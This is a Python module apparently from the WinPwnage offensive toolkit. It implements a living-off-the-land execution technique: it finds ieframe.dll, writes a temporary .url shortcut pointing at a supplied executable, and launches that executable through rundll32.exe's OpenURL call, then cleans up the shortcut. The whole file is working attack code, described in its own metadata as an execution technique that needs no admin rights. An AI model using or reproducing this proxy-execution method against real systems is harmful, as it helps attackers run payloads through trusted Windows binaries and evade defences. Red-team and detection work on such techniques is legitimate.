import os
import random
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#https://lolbas-project.github.io/lolbas/Libraries/Ieframe/

ieframe_info = {
	"Description": "Launch an executable payload by calling OpenURL in ieframe.dll",
	"Id": "9",
	"Type": "Execution",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "exec_ieframe",
	"Function Payload": True,
}

def exec_ieframe(payload):
	if payloads().exe(payload):
		paths = []
		dll = "ieframe.dll"
		binary = "rundll32.exe"

		print_info("Searching for ({dll}) in system32 and syswow64".format(dll=dll))
		for root, dirs, files in os.walk(information().windows_directory()):	
			for name in files:
				if name.lower() == dll:
					if "system32" in root.lower() or "syswow64" in root.lower():
						paths.append(os.path.join(root, name))

		try:
			path = random.choice(paths)
		except IndexError:
			print_error("Unable to proceed, ({dll}) not found on system".format(dll=dll))
			return False
		else:
			with open(os.path.join(tempfile.gettempdir(),"ieframe.url"), "w") as f:
				f.write("\n[InternetShortcut]\nURL=file:///{payload}\n".format(payload=payload))

			print_info("Attempting to launch {payload} using ({binary}) binary".format(payload=payload,binary=binary))
			exit_code = process().create(binary,
						params="{dll},OpenURL {path}".format(dll=dll,path=os.path.join(tempfile.gettempdir(),"ieframe.url")),
						get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully created process ({}) exit code ({})".format(payload, exit_code))
			else:
				print_error("Unable to create process ({}) exit code ({})".format(payload, exit_code))
				return False

			try:
				os.remove(os.path.join(tempfile.gettempdir(),"ieframe.url"))
			except Exception:
				pass
	else:
		print_error("Cannot proceed, invalid payload")
		return False				